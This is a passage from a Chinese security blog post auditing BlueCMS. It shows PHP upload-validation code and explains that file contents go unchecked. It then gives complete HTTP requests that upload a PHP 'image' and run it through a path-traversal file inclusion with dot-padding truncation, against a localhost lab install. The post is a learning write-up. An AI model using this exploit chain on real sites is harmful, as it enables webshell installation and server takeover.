showmsg(<span class="string">'上传图片出错'</span>, <span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    $image_path = <span class="keyword">empty</span>($image_path) ? <span class="string">''</span> : $image_path;</span><br><span class="line">    <span class="keyword">if</span>(!$db-&gt;query(<span class="string">"INSERT INTO "</span>.table(<span class="string">'flash_image'</span>).<span class="string">" (image_id, image_path, image_link, show_order) VALUES ('', '$image_path', '$image_link', '$show_order')"</span>))&#123;</span><br><span class="line">    	showmsg(<span class="string">'添加flash图片出错'</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	showmsg(<span class="string">'添加flash图片成功'</span>, <span class="string">'flash.php'</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>我们跟踪一下<strong>img_upload</strong>函数，定位到<code>/include/upload.class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $allow_image_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>, <span class="string">'image/gif'</span>, <span class="string">'image/png'</span>, <span class="string">'image/pjpeg'</span>);</span><br><span class="line">	<span class="keyword">private</span> $extension_name_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'pjpeg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">img_upload</span><span class="params">($file, $dir = <span class="string">''</span>, $imgname = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span>(!in_array($file[<span class="string">'type'</span>],<span class="keyword">$this</span>-&gt;allow_image_type))&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">'&lt;font style="color:red;"&gt;不允许的图片类型&lt;/font&gt;'</span>;</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($imgname))&#123;</span><br><span class="line">    		$imgname = <span class="keyword">$this</span>-&gt;create_tempname().<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;get_type($file[<span class="string">'name'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_type</span><span class="params">($filepath)</span></span>&#123;</span><br><span class="line">    	$pos = strrpos($filepath,<span class="string">'.'</span>);</span><br><span class="line">    	<span class="keyword">echo</span> $pos;</span><br><span class="line">    	<span class="keyword">if</span>($pos !== <span class="keyword">false</span>)&#123;</span><br><span class="line">    		$extension_name = substr($filepath,$pos+<span class="number">1</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="comment">//echo $extension_name;</span></span><br><span class="line">		<span class="keyword">if</span>(!in_array($extension_name, <span class="keyword">$this</span>-&gt;extension_name_arr))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font style="color:red;"&gt;您上传的文件不符合要求,请重试&lt;/font&gt;'</span>;</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $extension_name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该文件对上传文件进行文件类型和文件名的白名单检测，但是没有对文件内容进行检查，所以我们能轻易上传一个图片马</p>
<p>payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/flash.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 499</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/admin/flash.php?act=add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;image_path&quot;; filename=&quot;info.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;image_link&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;show_order&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;act&quot;</span><br><span class="line"></span><br><span class="line">do_add</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b--</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/bluecms/13.png" alt=""></p>
<p><img src="../../../../img/bluecms/14.png" alt=""></p>
<p>上传成功后我们可以通过管理员界面得知上传文件所在目录为<code>data/upload/flash/15525638906.jpg</code></p>
<p>我们再通过文件包含漏洞执行该图片马</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=pay HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">pay=../../data/upload/flash/15525638906.jpg........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/bluecms/15.png" alt=""></p>
<p>成功执行webshell</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，这次代码审计虽然花的时间比较久，但是收获了审计的思路，从一开始看到一个陌生的cms不知从何下手到慢慢有思路，有方法的审计，这个过程还是挺开心的，相信只要花时间有耐心，一定能提高自己的审计能力，最后附上参考文章：</p>
<p><a href="https://www.freebuf.com/articles/web/166602.html" target="_blank" rel="noopener">一名代码审计新手的实战经历与感悟</a></p>
<p><a href="https://www.freebuf.com/vuls/196190.html" target="_blank" rel="noopener">从小众blueCMS入坑代码审计</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/03/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-bluecms/">https://nikoeurus.github.io/2019/03/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-bluecms/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-74cms3.0/"><i class="fa fa-chevron-left">  </i><span>代码审计--74cms3.0</span></a></div><div class="next-post pull-right"><a href="/2019/03/07/Linux%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"><span>Linux文件与目录管理</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>